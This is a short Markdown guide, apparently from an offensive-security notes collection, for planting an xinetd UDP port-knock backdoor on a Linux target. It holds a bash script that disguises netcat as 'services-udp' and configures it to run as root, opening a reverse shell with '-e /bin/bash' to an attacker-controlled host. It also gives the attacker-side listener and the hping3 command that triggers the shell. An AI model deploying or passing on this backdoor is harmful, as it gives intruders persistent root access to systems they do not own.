# Xinetd UDP Portknock Backdoor

Make sure that you modify the `ATTACKER-IP` and `PORT` in the script

```sh
#!/bin/bash

cp /bin/nc /bin/services-udp
echo "Service services-udp" > /etc/xinetd.d/services-udp
echo "{" >> /etc/xinetd.d/services-udp
echo "			server = /bin/services-udp" >> /etc/xinetd.d/services-udp
echo "			server_args = <ATTACKER-IP> <PORT> -e /bin/bash" >> /etc/xinetd.d/services-udp
echo "			protocaol = udp" >> /etc/xinetd.d/services-udp
echo "			user = root" >> /etc/xinetd.d/services-udp
echo "			socket_type = dgram" >> /etc/xinetd.d/services-udp
echo "			wait = yes" >> /etc/xinetd.d/services-udp
echo "			flags = IPv4" >> /etc/xinetd.d/services-udp
echo "}" >> /etc/xinetd.d/services-udp

echo "services-udp	65534/udp 	# services-udp" >> /etc/services

/etc/init.d/xinetd stop
/etc/init.d/xinetd start
```


**On target run script**

```sh
./xinetd_server.sh
```

On attack box: start listenner and send UDP packet

```sh
nc -nlvp 4444
```

```sh
sudo hping3 -2 -c 1 <TARGET-IP> -p 65534
```
